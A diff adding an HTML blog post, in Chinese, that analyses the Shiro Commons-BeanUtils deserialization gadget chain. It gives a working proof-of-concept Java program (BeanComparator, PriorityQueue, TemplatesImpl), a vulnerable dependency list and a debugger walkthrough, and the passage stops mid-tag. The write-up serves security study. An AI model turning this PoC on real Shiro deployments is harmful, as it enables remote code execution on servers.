@@ -1,0 +1,366 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="referrer" content="no-referrer" />
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>ShiroのCommonBeanUtils利用链 - Boogiepop Doesn&#39;t Laugh</title>
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    <link rel='manifest' href='/manifest.json'>
+  
+
+  
+  
+  
+  <meta property="og:title" content="ShiroのCommonBeanUtils利用链 - Boogiepop Doesn&#39;t Laugh" />
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:url" content="http://boogipop.com/2023/03/29/Shiro%20_%20CommonBeanUtils%E5%88%A9%E7%94%A8%E9%93%BE/index.html" />
+  
+  <meta property="og:image" content="/favicon.png" />
+  
+  <meta property="og:article:published_time" content="2023-03-29T13:32:40.000Z" />
+  
+  <meta property="og:article:author" content="Boogipop" />
+  
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+<link rel="stylesheet" href="/css/components.css">
+
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+<link rel="stylesheet" href="/css/giscus.css">
+
+  
+  
+<link rel="stylesheet" href="/css/rainbow-banner.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/css/giscus.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+  
+  
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+    <body
+        data-color-scheme="auto"
+        data-uppercase-categories="true"
+        
+        data-rainbow-banner="true"
+        data-rainbow-banner-shown="auto"
+        data-rainbow-banner-month="6"
+        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
+        
+        data-config-root="/"
+        
+        data-toc="true"
+        data-toc-max-depth="2"
+        
+        
+    >
+        <nav id="theme-nav">
+    <div class="inner">
+        <a class="title" href="/">Blog</a>
+        <div class="nav-arrow"></div>
+        <div class="nav-items">
+            <a class="nav-item nav-item-home" href="/">Home</a>
+            
+            
+            <a class="nav-item" href="/archives">Archives</a>
+            
+            
+            
+            <a class="nav-item" href="/friends">Friends</a>
+            
+            
+            
+            <a class="nav-item" href="/about">About</a>
+            
+            
+            
+            <a class="nav-item" href="/categories">Categories</a>
+            
+            
+            
+            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
+            
+            
+        </div>
+    </div>
+</nav>
+        
+<article class="post">
+    <div class="meta">
+        
+        <div class="categories text-uppercase">
+        
+            <a href="/categories/At-Dawn/">At Dawn</a>
+        
+        </div>
+        
+
+        
+        <div class="date" id="date">
+            <span>March</span>
+            <span>29,</span>
+            <span>2023</span>
+        </div>
+        
+
+        <h2 class="title">ShiroのCommonBeanUtils利用链</h2>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="content">
+        <h1 id="零、介绍"><a href="#零、介绍" class="headerlink" title="零、介绍"></a>零、介绍</h1><p>Shiro的CB链其实就是CC链做一些小改，因为Shiro框架首先是自带Commoncollections这个包的，除此之外还带了一个包叫做Common BeanUtils包，这个包就是本文的重点<br>这个包的作用本来是为了让我们方便对bean对象的属性进行各种操作而存在的，但是可以被当成CC链的跳板使用</p>
+<h1 id="一、回顾CommonCollections4利用链"><a href="#一、回顾CommonCollections4利用链" class="headerlink" title="一、回顾CommonCollections4利用链"></a>一、回顾CommonCollections4利用链</h1><p>在CC4中有如下图中调用的一条链<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671271693175-e005b8cb-3465-4e8a-9b4f-3a21c7907432.png?x-oss-process=image/resize,w_750,limit_0#averageHue=%23f5f5f5&from=url&id=Uo2E0&originHeight=388&originWidth=750&originalType=binary&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">* Gadget chain:</span><br><span class="line"> *      ObjectInputStream.readObject()</span><br><span class="line"> *          PriorityQueue.readObject()</span><br><span class="line"> *              PriorityQueue.heapify()</span><br><span class="line"> *                  PriorityQueue.siftDown()</span><br><span class="line"> *                 PriorityQueue.siftDownUsingComparator()</span><br><span class="line"> *                     TransformingComparator.compare()</span><br><span class="line"> *                         InvokerTransformer.transform()</span><br><span class="line"> *                             Method.invoke()</span><br><span class="line"> *                                 TemplatesImpl.newTransformer()</span><br><span class="line"> *                                     TemplatesImpl.getTransletInstance()</span><br><span class="line"> *                                         Runtime.exec()</span><br></pre></td></tr></table></figure>
+<p>这个链是进行恶意类加载的，其中用到了CommonCollection的类都有:</p>
+<ul>
+<li>TransformingComparator</li>
+<li>Transformer</li>
+<li>TiedMapEntry</li>
+<li>InstantiateTransformer</li>
+<li>InvokerTransformer</li>
+</ul>
+<p>主要是第一个，后面三个在接下来会发现不需要用到</p>
+<h1 id="二、Common-BeanUtils利用链"><a href="#二、Common-BeanUtils利用链" class="headerlink" title="二、Common-BeanUtils利用链"></a>二、Common-BeanUtils利用链</h1><p>CB链和CC4的异同点就在于触发compare这个地方，也就是在CB链中哪里调用了compare方法，进而连接上链子<br>通过Codeql或者tabby可以找到（这里推荐codeql，tabby建议用来找长链子，codeql来找单个类）BeanComparator这个类<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679888511348-19311a42-b74e-4c2d-8917-acad09fc7110.png#averageHue=%232c2c27&clientId=u72124afa-9982-4&from=paste&height=488&id=u4d23e491&name=image.png&originHeight=610&originWidth=1461&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1216011&status=done&style=none&taskId=u01d07c61-1d9c-43e7-8461-5f30d54f7f1&title=&width=1168.8" alt="image.png"><br>这个类的compare方法调用了<code>PropertyUtils.getProperty</code>方法<br>这个类实际上会进行一个任意类的get方法调用<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679888573621-342fbab3-dd29-4a99-9b42-ffc9d74b9fae.png#averageHue=%232f2f2b&clientId=u72124afa-9982-4&from=paste&height=154&id=u2db5f2d7&name=image.png&originHeight=193&originWidth=959&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=270126&status=done&style=none&taskId=ufa815f86-1b92-4c51-94e5-6c6da39f801&title=&width=767.2" alt="image.png"><br>我们可以调用任意bean(class)的一个get方法去获取<code>property</code>属性，关于这一点我们可以写个Demo测试一下</p>
+<h2 id="（1）任意get调用"><a href="#（1）任意get调用" class="headerlink" title="（1）任意get调用"></a>（1）任意get调用</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Hello world!</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">App</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        PropertyUtils.getProperty(<span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;test&quot;</span>,<span class="string">&quot;111&quot;</span>), <span class="string">&quot;name&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name=<span class="string">&quot;Boogipop&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> String age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;get&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;set&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">(String name, String age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;get&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(String age)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;set&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>运行后会发现调用了get方法<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679890116073-3c344e71-0217-4748-873c-82aa79b5fb8f.png#averageHue=%23202120&clientId=u72124afa-9982-4&from=paste&height=112&id=uba1e4009&name=image.png&originHeight=140&originWidth=926&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=157928&status=done&style=none&taskId=ude9666fb-796d-4fb6-a1b1-8252ae98d78&title=&width=740.8" alt="image.png"></p>
+<h2 id="（2）任意类实例化"><a href="#（2）任意类实例化" class="headerlink" title="（2）任意类实例化"></a>（2）任意类实例化</h2><p>那么很容易就联想的到TempaltesImpl类进行恶意类实例化，因为该类有一个方法叫做<br><code>getOutputProperties()</code>这方法里面会进而触发任意类的实例化，从而执行命令，这个恶意类必须继承AbstractTranslet类，否则实例化失败，这都是之前学CC4讲的，这里直接放个链接<br><a target="_blank" rel="noopener" href="https://www.yuque.com/boogipop/iwyn7t/ta3so4z1os9us6aw?view=doc_embed&inner=mDgGf">Java反序列化研究</a></p>
+<h2 id="（3）CB链POC编写"><a href="#（3）CB链POC编写" class="headerlink" title="（3）CB链POC编写"></a>（3）CB链POC编写</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.NotFoundException;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Hello world!</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">App</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;</span><br><span class="line">                ClassPool.getDefault().get(evil.class.getName()).toBytecode()</span><br><span class="line">        &#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">        <span class="comment">// 为了能够继续走下去,priority的size必须大于等于2</span></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj, obj&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>这个POC中唯一需要注意的地方就是这个<code>queue.add</code>调用2次是为了能够正常的进行反序列化，因为最小大小是需要2的，这个下面分析的时候我会说明<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679907235428-393bbe66-1916-472b-a92a-92035c54f547.png#averageHue=%232d2e2a&clientId=u72124afa-9982-4&from=paste&height=824&id=uc6fb276f&name=image.png&originHeight=1030&originWidth=1676&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1968894&status=done&style=none&taskId=u9d10603b-ee87-48ee-9998-cd290ebd389&title=&width=1340.8" alt="image.png"><br>运行后成功弹出计算器，其中的依赖文件如下：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiroattack<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">packaging</span>&gt;</span>jar<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>shiroattack<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://maven.apache.org<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.27.0-GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.1.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="（4）POC链调试分析"><a href="#（4）POC链调试分析" class="headerlink" title="（4）POC链调试分析"></a>（4）POC链调试分析</h2><p>最外面套的还是优先队列PriorityQueue，因此在它的readObject方法上打上断点（其实CC4调了一遍，复古一次)	<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679907706428-fcb730e0-0f84-4cc8-8266-87d54fbb6c91.png#averageHue=%232a2b28&clientId=u72124afa-9982-4&from=paste&height=681&id=u744ecf62&name=image.png&originHeight=851&originWidth=1692&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1920339&status=done&style=none&taskId=u8b4ec725-ee30-4e08-9603-57fba247bd3&title=&width=1353.6" alt="image.png"><br>调用heapify方法，跟进<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679907735845-e492cb1b-7ce8-4ee9-8cf9-c7ffede82a98.png#averageHue=%232c2d28&clientId=u72124afa-9982-4&from=paste&height=664&id=ud7f57fc3&name=image.png&originHeight=830&originWidth=1270&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1406613&status=done&style=none&taskId=ua629387e-8c0a-427d-87e3-469bba377fb&title=&width=1016" alt="image.png"><br>这里由于我们先前add了两次，因此是2，假如不add的话就是0，那么再减去1就是-1,，也就无法继续走进siftDown方法，进而无法RCE，这就是之前埋下的坑，这里siftDown的第二个参数是queue数组，我们再POC中反射修改为2个恶意templatesimpl对象：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679907800426-d83aebd8-7182-4b66-a7d8-6f847b8c872e.png#averageHue=%23333634&clientId=u72124afa-9982-4&from=paste&height=92&id=u688dd8f0&name=image.png&originHeight=115&originWidth=567&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=97893&status=done&style=none&taskId=ud27f879e-d56c-4f9f-b925-f52e47fc5fe&title=&width=453.6" alt="image.png"><br>继续跟进<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679907814492-5d8ce4a7-d480-4adc-bf9a-bc1687aac1c2.png#averageHue=%23292a26&clientId=u72124afa-9982-4&from=paste&height=746&id=uaca5baf2&name=image.png&originHeight=933&originWidth=1808&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2169616&status=done&style=none&taskId=ue4640b6d-4769-4ba9-b337-c4a3f568afa&title=&width=1446.4" alt="image.png"><br>这里的k是0，v就是恶意templatesimpl，随即进入siftDownUsingComparator方法<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679908190183-bf10efc5-d0d2-43e1-83f8-202229160cba.png#averageHue=%23292a26&clientId=u8f78e0c1-fda6-4&from=paste&height=724&id=u6760a07b&name=image.png&originHeight=905&originWidth=1903&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2217203&status=done&style=none&taskId=ueff58086-d820-4bf0-862f-5d3f64c473a&title=&width=1522.4" alt="image.png"><br>进行一系列的位移操作，chind索引为1，然后c也就是索引为1也就是数组中第二个obj，由于我们传入的2个obj都一样，所以进入compare方法的两个obj都是TemplatesImpl<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679908258198-4bdf19c1-111a-4603-992e-37d817da1b13.png#averageHue=%232d2e2a&clientId=u8f78e0c1-fda6-4&from=paste&height=286&id=ufa599f98&name=image.png&originHeight=358&originWidth=1694&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=837691&status=done&style=none&taskId=u449a4c3e-74b8-4d5a-ad1d-ea0edf3916b&title=&width=1355.2" alt="image.png"><br>调用一开始说的getProperty方法，也就是会调用任意get，剩下的就是Templates链的内容了，温习一遍。<br><img 